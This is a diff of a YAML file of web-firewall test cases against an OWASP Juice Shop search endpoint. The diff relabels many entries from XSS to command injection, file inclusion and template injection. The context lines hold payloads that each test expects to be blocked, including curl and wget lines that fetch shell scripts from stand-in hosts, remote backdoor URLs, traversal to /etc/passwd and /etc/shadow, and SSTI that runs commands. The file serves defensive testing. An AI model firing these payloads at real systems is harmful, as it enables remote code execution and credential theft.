@@ -511,7 +511,7 @@ requirements:
     test_payload: '&lt;img src=x onerror=alert(1)&gt;'
     expected_action: BLOCK
 - id: juiceshop-0036
-  tuning_type: xss
+  tuning_type: base64
   description: XSS payload test 36
   uri: /rest/products/search
   method: POST
@@ -1379,7 +1379,7 @@ requirements:
     test_payload: 1%27)%20OR%20(%271%27%3D%271
     expected_action: BLOCK
 - id: juiceshop-0098
-  tuning_type: xss
+  tuning_type: base64
   description: XSS payload test 98
   uri: /rest/products/search
   method: POST
@@ -1659,7 +1659,7 @@ requirements:
     test_payload: '%2527%2520OR%25201%253D1%2520--'
     expected_action: BLOCK
 - id: juiceshop-0118
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 118
   uri: /rest/products/search
   method: POST
@@ -1757,7 +1757,7 @@ requirements:
     test_payload: '|wget$\{IFS\}attacker.site%2fshell.sh'
     expected_action: BLOCK
 - id: juiceshop-0125
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 125
   uri: /rest/products/search
   method: POST
@@ -1771,7 +1771,7 @@ requirements:
     test_payload: '%2526%2526whoami'
     expected_action: BLOCK
 - id: juiceshop-0126
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 126
   uri: /rest/products/search
   method: POST
@@ -1869,7 +1869,7 @@ requirements:
     test_payload: ''';`wget attacker.sh`;//'
     expected_action: BLOCK
 - id: juiceshop-0133
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 133
   uri: /rest/products/search
   method: POST
@@ -1967,7 +1967,7 @@ requirements:
     test_payload: ; curl http://evil.com/shell.sh | sh
     expected_action: BLOCK
 - id: juiceshop-0140
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 140
   uri: /rest/products/search
   method: POST
@@ -1995,7 +1995,7 @@ requirements:
     test_payload: '%26%26%20whoami'
     expected_action: BLOCK
 - id: juiceshop-0142
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 142
   uri: /rest/products/search
   method: POST
@@ -2009,7 +2009,7 @@ requirements:
     test_payload: '%3B%20id'
     expected_action: BLOCK
 - id: juiceshop-0143
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 143
   uri: /rest/products/search
   method: POST
@@ -2149,7 +2149,7 @@ requirements:
     test_payload: php://filter/convert.base64-encode/resource=index.php
     expected_action: BLOCK
 - id: juiceshop-0153
-  tuning_type: xss
+  tuning_type: lfi
   description: XSS payload test 153
   uri: /rest/products/search
   method: POST
@@ -2219,7 +2219,7 @@ requirements:
     test_payload: ../.../.../.../.../.../.../etc/shadow
     expected_action: BLOCK
 - id: juiceshop-0158
-  tuning_type: xss
+  tuning_type: lfi
   description: XSS payload test 158
   uri: /rest/products/search
   method: POST
@@ -2289,7 +2289,7 @@ requirements:
     test_payload: ..//..//..//etc//passwd
     expected_action: BLOCK
 - id: juiceshop-0163
-  tuning_type: xss
+  tuning_type: lfi
   description: XSS payload test 163
   uri: /rest/products/search
   method: POST
@@ -2359,7 +2359,7 @@ requirements:
     test_payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
     expected_action: BLOCK
 - id: juiceshop-0168
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 168
   uri: /rest/products/search
   method: POST
@@ -2373,7 +2373,7 @@ requirements:
     test_payload: http://evil.com/shell.txt
     expected_action: BLOCK
 - id: juiceshop-0169
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 169
   uri: /rest/products/search
   method: POST
@@ -2387,7 +2387,7 @@ requirements:
     test_payload: '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt'
     expected_action: BLOCK
 - id: juiceshop-0170
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 170
   uri: /rest/products/search
   method: POST
@@ -2401,7 +2401,7 @@ requirements:
     test_payload: https://evil.com/backdoor.php
     expected_action: BLOCK
 - id: juiceshop-0171
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 171
   uri: /rest/products/search
   method: POST
@@ -2415,7 +2415,7 @@ requirements:
     test_payload: '%252f%252fmalicious.com%252fshell.txt'
     expected_action: BLOCK
 - id: juiceshop-0172
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 172
   uri: /rest/products/search
   method: POST
@@ -2429,7 +2429,7 @@ requirements:
     test_payload: '%5c%5cattacker.com%5cbackdoor.txt'
     expected_action: BLOCK
 - id: juiceshop-0173
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 173
   uri: /rest/products/search
   method: POST
@@ -2443,7 +2443,7 @@ requirements:
     test_payload: https://attacker.site/malware.php
     expected_action: BLOCK
 - id: juiceshop-0174
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 174
   uri: /rest/products/search
   method: POST
@@ -2485,7 +2485,7 @@ requirements:
     test_payload: http://[::]/evil.php
     expected_action: BLOCK
 - id: juiceshop-0177
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 177
   uri: /rest/products/search
   method: POST
@@ -2513,7 +2513,7 @@ requirements:
     test_payload: http%3A%2F%2F127.0.0.1%2Fevil.txt
     expected_action: BLOCK
 - id: juiceshop-0179
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 179
   uri: /rest/products/search
   method: POST
@@ -2527,7 +2527,7 @@ requirements:
     test_payload: http://evil.com%00/shell.php
     expected_action: BLOCK
 - id: juiceshop-0180
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 180
   uri: /rest/products/search
   method: POST
@@ -2541,7 +2541,7 @@ requirements:
     test_payload: http://evil.com//shell.txt
     expected_action: BLOCK
 - id: juiceshop-0181
-  tuning_type: xss
+  tuning_type: rfi
   description: XSS payload test 181
   uri: /rest/products/search
   method: POST
@@ -3033,7 +3033,7 @@ requirements:
     test_payload: '&#x3C;video src=javascript:alert(''Payload17'')&#x3E;&#x3C;/video&#x3E;'
     expected_action: BLOCK
 - id: juiceshop-0216
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 216
   uri: /rest/products/search
   method: POST
@@ -3047,7 +3047,7 @@ requirements:
     test_payload: <%= 7 * 7 %>
     expected_action: BLOCK
 - id: juiceshop-0217
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 217
   uri: /rest/products/search
   method: POST
@@ -3075,7 +3075,7 @@ requirements:
     test_payload: $\{T(java.lang.Runtime).getRuntime().exec('id')\}
     expected_action: BLOCK
 - id: juiceshop-0219
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 219
   uri: /rest/products/search
   method: POST
@@ -3089,7 +3089,7 @@ requirements:
     test_payload: '%7B%7B7*7%7D%7D'
     expected_action: BLOCK
 - id: juiceshop-0220
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 220
   uri: /rest/products/search
   method: POST
@@ -3103,7 +3103,7 @@ requirements:
     test_payload: '%24%7B7*7%7D'
     expected_action: BLOCK
 - id: juiceshop-0221
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 221
   uri: /rest/products/search
   method: POST
@@ -3117,7 +3117,7 @@ requirements:
     test_payload: $\{3*3\}
     expected_action: BLOCK
 - id: juiceshop-0222
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 222
   uri: /rest/products/search
   method: POST
@@ -3131,7 +3131,7 @@ requirements:
     test_payload: $\{\{7*7\}\}
     expected_action: BLOCK
 - id: juiceshop-0223
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 223
   uri: /rest/products/search
   method: POST
@@ -3159,7 +3159,7 @@ requirements:
     test_payload: <%= File.open('/etc/passwd').read %>
     expected_action: BLOCK
 - id: juiceshop-0225
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 225
   uri: /rest/products/search
   method: POST
@@ -3173,7 +3173,7 @@ requirements:
     test_payload: <#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")\}
     expected_action: BLOCK
 - id: juiceshop-0226
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 226
   uri: /rest/products/search
   method: POST
@@ -3188,7 +3188,7 @@ requirements:
       ex(''id'')\}'
     expected_action: BLOCK
 - id: juiceshop-0227
-  tuning_type: xss
+  tuning_type: ssti
   description: XSS payload test 227
   uri: /rest/products/search
   method: POST
@@ -4546,7 +4546,7 @@ requirements:
     test_payload: <IFRAME SRC="jav&#x09;ascript:alert(1)">
     expected_action: BLOCK
 - id: juiceshop-0324
-  tuning_type: xss
+  tuning_type: lfi
   description: XSS payload test 324
   uri: /rest/products/search
   method: POST
@@ -4798,7 +4798,7 @@ requirements:
     test_payload: 1-- -
     expected_action: BLOCK
 - id: juiceshop-0342
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 342
   uri: /rest/products/search
   method: POST
@@ -4812,7 +4812,7 @@ requirements:
     test_payload: sh$\{IFS\}-c$\{IFS\}whoami
     expected_action: BLOCK
 - id: juiceshop-0343
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 343
   uri: /rest/products/search
   method: POST
@@ -4826,7 +4826,7 @@ requirements:
     test_payload: bash$\{IFS\}-c$\{IFS\}'id'
     expected_action: BLOCK
 - id: juiceshop-0344
-  tuning_type: xss
+  tuning_type: cmdi
   description: XSS payload test 344
   uri: /rest/products/search
   method: POST
@@ -4839,3 +4839,4 @@ requirements:
   test_config:
     test_payload: $\{IFS\}'id'}
     expected_action: BLOCK
+
